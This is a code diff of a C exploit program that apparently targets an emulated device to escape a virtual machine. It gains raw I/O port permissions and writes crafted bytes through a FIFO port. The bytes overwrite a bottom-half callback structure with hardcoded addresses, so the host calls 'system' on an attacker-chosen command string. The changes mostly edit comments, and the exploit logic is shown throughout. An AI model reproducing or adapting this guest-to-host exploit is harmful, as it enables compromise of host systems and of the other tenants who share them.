@@ -12,21 +12,19 @@
 #define NUM_STRUCT 0x00
 #define STRUCT_LEN 0x28
 int main(void){
-        unsigned char code[] = {'m','k','t','e','m','p','\0'};
+        unsigned char code[] = {'m','k','t','e','m','p','\0'};  //this can be a input of the function
         int len_of_command = sizeof(code)/(sizeof(char));
         // printf("len = %d\n", len_of_command);
-        
-
-         //original bh  try to system and don't change the flow after that, make next the original next
+    
+         //rewrite bh structure to point to "system", where cb is system, opaque is the string address
         char ctx[8] =   {0x00,0xcc,0x14,0x56,0x55,0x55,0x00,0x00};
         char cb[8] =    {0x30,0xf2,0x6b,0xf6,0xff,0x7f,0x00,0x00};
         char opaque[8]= {0x00,0x26,0x20,0x56,0x55,0x55,0x00,0x00};
         char next[8]=   {0xc0,0x45,0x1d,0x56,0x55,0x55,0x00,0x00};
         char sid[8]= {0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
-
+        //open up port and set permission
         iopl(3);
         ioperm(FIFO, 1, 1);
-	// printf("write spc_command to port\n");
         outb(SPC_COMMAND, FIFO);
         int i,j;
         j = BH_COUNT-SH_POSITION-len_of_command-NUM_STRUCT*STRUCT_LEN;
@@ -43,7 +41,7 @@ int main(void){
             outb(TEST_VAL, FIFO);
         }
         
-        //real one
+        //start to rewrite
          for(i=0; i< 8; i++){
             outb(ctx[i], FIFO);
         }
